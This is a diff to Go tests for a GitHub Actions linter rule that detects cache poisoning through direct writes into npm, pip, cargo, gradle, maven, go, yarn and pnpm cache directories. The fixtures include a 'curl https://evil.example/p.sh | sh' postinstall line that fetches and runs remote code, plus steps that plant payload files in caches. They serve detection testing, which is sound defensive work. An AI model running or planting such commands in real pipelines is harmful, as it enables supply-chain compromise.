@@ -1402,13 +1402,13 @@ cat > ~/.npm/_cacache/content-v2/sha512/malicious <<'PAYLOAD'
 {"scripts":{"postinstall":"curl https://evil.example/p.sh | sh"}}
 PAYLOAD`,
 			wantErrors:    2,
-			wantSubstring: "~/.npm/_cacache",
+			wantSubstring: "~/.npm",
 		},
 		{
 			name:          "mkdir writes npm cache directory without trailing slash",
 			script:        `mkdir -p ~/.npm/_cacache`,
 			wantErrors:    1,
-			wantSubstring: "~/.npm/_cacache",
+			wantSubstring: "~/.npm",
 		},
 		{
 			name:          "cp writes pip cache directory",
@@ -1420,43 +1420,43 @@ PAYLOAD`,
 			name:          "mkdir writes cargo registry cache",
 			script:        `mkdir -p ~/.cargo/registry/src/malicious`,
 			wantErrors:    1,
-			wantSubstring: "~/.cargo/registry",
+			wantSubstring: "~/.cargo",
 		},
 		{
 			name:          "touch writes gradle cache",
 			script:        `touch ~/.gradle/caches/modules-2/files-2.1/payload`,
 			wantErrors:    1,
-			wantSubstring: "~/.gradle/caches",
+			wantSubstring: "~/.gradle",
 		},
 		{
 			name:          "printf redirects into maven repository cache",
 			script:        `printf '%s\n' payload > ~/.m2/repository/com/example/payload.jar`,
 			wantErrors:    1,
-			wantSubstring: "~/.m2/repository",
+			wantSubstring: "~/.m2",
 		},
 		{
 			name:          "install writes go module cache",
 			script:        `install -D payload ~/go/pkg/mod/cache/download/example.com/mod/@v/v1.0.0.zip`,
 			wantErrors:    1,
-			wantSubstring: "~/go/pkg/mod/cache",
+			wantSubstring: "~/go/pkg/mod",
 		},
 		{
 			name:          "sudo wrapper still writes npm cache directory",
 			script:        `sudo -E mkdir -p ~/.npm/_cacache/content-v2/sha512`,
 			wantErrors:    1,
-			wantSubstring: "~/.npm/_cacache",
+			wantSubstring: "~/.npm",
 		},
 		{
 			name:          "env wrapper still writes npm cache directory",
 			script:        `env FOO=bar mkdir -p ~/.npm/_cacache/content-v2/sha512`,
 			wantErrors:    1,
-			wantSubstring: "~/.npm/_cacache",
+			wantSubstring: "~/.npm",
 		},
 		{
 			name:          "chained command writes npm cache directory",
 			script:        `sudo mkdir -p ~/.npm/_cacache && echo ok`,
 			wantErrors:    1,
-			wantSubstring: "~/.npm/_cacache",
+			wantSubstring: "~/.npm",
 		},
 		{
 			name:          "cp to pip cache followed by chained command",
@@ -1468,13 +1468,13 @@ PAYLOAD`,
 			name:          "pipe into tee writes npm cache directory",
 			script:        `printf payload | tee ~/.npm/_cacache/content-v2/sha512/malicious`,
 			wantErrors:    1,
-			wantSubstring: "~/.npm/_cacache",
+			wantSubstring: "~/.npm",
 		},
 		{
 			name:          "shell wrapper writes npm cache directory",
 			script:        `sh -c 'mkdir -p ~/.npm/_cacache/content-v2/sha512'`,
 			wantErrors:    1,
-			wantSubstring: "~/.npm/_cacache",
+			wantSubstring: "~/.npm",
 		},
 		{
 			name:          "package manager cache command is not direct write",
@@ -1514,7 +1514,7 @@ PAYLOAD`,
 		},
 		{
 			name:          "sibling directory with similar prefix is not cache directory",
-			script:        `mkdir -p ~/.npm/_cacache-old`,
+			script:        `mkdir -p ~/.npm-old/_cacache`,
 			wantErrors:    0,
 			wantSubstring: "",
 		},
@@ -1531,7 +1531,8 @@ PAYLOAD`,
 				},
 			}
 			_ = rule.VisitWorkflowPre(workflow)
-			_ = rule.VisitJobPre(&ast.Job{})
+			job := &ast.Job{}
+			_ = rule.VisitJobPre(job)
 
 			step := &ast.Step{
 				Pos: &ast.Position{Line: 10, Col: 1},
@@ -1543,13 +1544,23 @@ PAYLOAD`,
 				},
 			}
 			_ = rule.VisitStep(step)
+			// Deferred reports are emitted in VisitJobPost so the rule can
+			// split severity based on whether a cache-save step follows.
+			_ = rule.VisitJobPost(job)
 
 			errors := rule.Errors()
 			if len(errors) != tt.wantErrors {
 				t.Fatalf("Expected %d errors, got %d: %#v", tt.wantErrors, len(errors), errors)
 			}
-			if tt.wantSubstring != "" && !strings.Contains(errors[0].Description, tt.wantSubstring) {
-				t.Fatalf("Expected error to contain %q, got %q", tt.wantSubstring, errors[0].Description)
+			if tt.wantSubstring != "" {
+				if !strings.Contains(errors[0].Description, tt.wantSubstring) {
+					t.Fatalf("Expected error to contain %q, got %q", tt.wantSubstring, errors[0].Description)
+				}
+				// No cache-save step in this case → reports must be the
+				// softer "(suspicious)" tier.
+				if !strings.Contains(errors[0].Description, "(suspicious)") {
+					t.Fatalf("Expected error to be tagged (suspicious), got %q", errors[0].Description)
+				}
 			}
 		})
 	}
@@ -1565,7 +1576,8 @@ func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeCacheSave(t *testing.
 		},
 	}
 	_ = rule.VisitWorkflowPre(workflow)
-	_ = rule.VisitJobPre(&ast.Job{})
+	job := &ast.Job{}
+	_ = rule.VisitJobPre(job)
 
 	writeStep := &ast.Step{
 		Pos: &ast.Position{Line: 10, Col: 1},
@@ -1589,16 +1601,20 @@ func TestCachePoisoningRule_DirectCacheDirectoryWriteBeforeCacheSave(t *testing.
 		},
 	}
 	_ = rule.VisitStep(saveStep)
+	_ = rule.VisitJobPost(job)
 
 	errors := rule.Errors()
-	if len(errors) != 2 {
-		t.Fatalf("Expected direct write and cache save errors, got %d: %#v", len(errors), errors)
+	if len(errors) != 1 {
+		t.Fatalf("Expected exactly 1 critical write report, got %d: %#v", len(errors), errors)
 	}
-	if !strings.Contains(errors[1].Description, "actions/cache/save follows direct writes") {
-		t.Fatalf("Expected cache save follow-up warning, got %q", errors[1].Description)
+	if !strings.Contains(errors[0].Description, "(critical)") {
+		t.Fatalf("Expected report to be tagged (critical), got %q", errors[0].Description)
 	}
-	if !strings.Contains(errors[1].Description, "~/.npm/_cacache") {
-		t.Fatalf("Expected cache save warning to mention cache directory, got %q", errors[1].Description)
+	if !strings.Contains(errors[0].Description, "~/.npm") {
+		t.Fatalf("Expected report to mention cache directory, got %q", errors[0].Description)
+	}
+	if !strings.Contains(errors[0].Description, "cache action in the same job") {
+		t.Fatalf("Expected report to explain the persistence vector, got %q", errors[0].Description)
 	}
 }
 
@@ -2084,6 +2100,111 @@ func TestCachePoisoningRule_IsPushToDefaultBranch(t *testing.T) {
 			got := rule.isPushToDefaultBranch(tt.event)
 			if got != tt.expected {
 				t.Errorf("isPushToDefaultBranch() = %v, want %v", got, tt.expected)
+			}
+		})
+	}
+}
+
+// TestCachePoisoningRule_DirectCacheDirectoryWrite_EndToEnd exercises the
+// full Parse → VisitTree pipeline for direct cache-directory writes. This
+// catches issues that hand-built ast trees miss, e.g. visitor ordering and
+// position propagation through the YAML loader.
+func TestCachePoisoningRule_DirectCacheDirectoryWrite_EndToEnd(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name         string
+		yaml         string
+		wantSeverity string // "(suspicious)" or "(critical)"
+		wantPath     string
+		wantCount    int
+	}{
+		{
+			name: "default ~/.npm write without save is suspicious",
+			yaml: `
+name: w
+on: push
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          mkdir -p ~/.npm/_cacache/content-v2/sha512
+`,
+			wantSeverity: "(suspicious)",
+			wantPath:     "~/.npm",
+			wantCount:    1,
+		},
+		{
+			name: "yarn cache write before actions/cache is critical",
+			yaml: `
+name: w
+on: push
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - run: tar -xf payload.tar -C ~/.cache/yarn
+      - uses: actions/cache@v4
+        with:
+          path: ~/.cache/yarn
+          key: yarn-${{ github.sha }}
+`,
+			wantSeverity: "(critical)",
+			wantPath:     "~/.cache/yarn",
+			wantCount:    1,
+		},
+		{
+			name: "pnpm store write before setup-node with cache: pnpm is critical",
+			yaml: `
+name: w
+on: push
+jobs:
+  w:
+    runs-on: ubuntu-latest
+    steps:
+      - run: cp ./payload ~/.local/share/pnpm/store/v3/files/00/payload
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+          cache: pnpm
+`,
+			wantSeverity: "(critical)",
+			wantPath:     "~/.local/share/pnpm/store",
+			wantCount:    1,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			workflow, parseErrs := Parse([]byte(tt.yaml))
+			if len(parseErrs) > 0 {
+				t.Fatalf("Parse returned errors: %v", parseErrs)
+			}
+
+			rule := NewCachePoisoningRule()
+			visitor := NewSyntaxTreeVisitor()
+			visitor.AddVisitor(rule)
+			if err := visitor.VisitTree(workflow); err != nil {
+				t.Fatalf("VisitTree returned error: %v", err)
+			}
+
+			var writeErrs []string
+			for _, e := range rule.Errors() {
+				if strings.Contains(e.Description, "cache poisoning via package manager cache directory write") {
+					writeErrs = append(writeErrs, e.Description)
+				}
+			}
+			if len(writeErrs) != tt.wantCount {
+				t.Fatalf("len(write errors) = %d, want %d:\n%s", len(writeErrs), tt.wantCount, strings.Join(writeErrs, "\n"))
+			}
+			if !strings.Contains(writeErrs[0], tt.wantSeverity) {
+				t.Fatalf("write error severity not %q: %s", tt.wantSeverity, writeErrs[0])
+			}
+			if !strings.Contains(writeErrs[0], tt.wantPath) {
+				t.Fatalf("write error path not %q: %s", tt.wantPath, writeErrs[0])
 			}
 		})
 	}
